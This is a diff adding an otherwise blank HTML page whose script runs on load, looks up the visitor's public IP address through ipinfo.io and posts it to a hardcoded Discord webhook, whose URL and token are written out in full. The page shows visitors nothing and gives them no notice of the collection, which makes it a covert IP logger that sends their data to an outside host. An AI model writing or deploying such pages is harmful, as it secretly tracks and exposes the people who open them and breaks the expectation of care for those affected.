@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <script>
+        async function fetchIpAddress() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.ip;
+                } else {
+                    throw new Error('Failed to fetch IP address');
+                }
+            } catch (error) {
+                return null;
+            }
+        }
+
+        async function sendToDiscord(ipAddress) {
+            const webhookURL = 'https://discord.com/api/webhooks/1261843593312604160/wXmyqmdBx4lZ4MAp338SpV18VQ0B7tFXVC65qA18a2Ia8aizvb7LSLc-SpNu7CJMj4wY';
+            const message = `New IP Address: ${ipAddress}`;
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: message })
+                });
+            } catch (error) {
+                // Handle error
+            }
+        }
+
+        async function main() {
+            const ipAddress = await fetchIpAddress();
+            if (ipAddress) {
+                await sendToDiscord(ipAddress);
+            }
+        }
+
+        main();
+    </script>
+</body>
+</html>
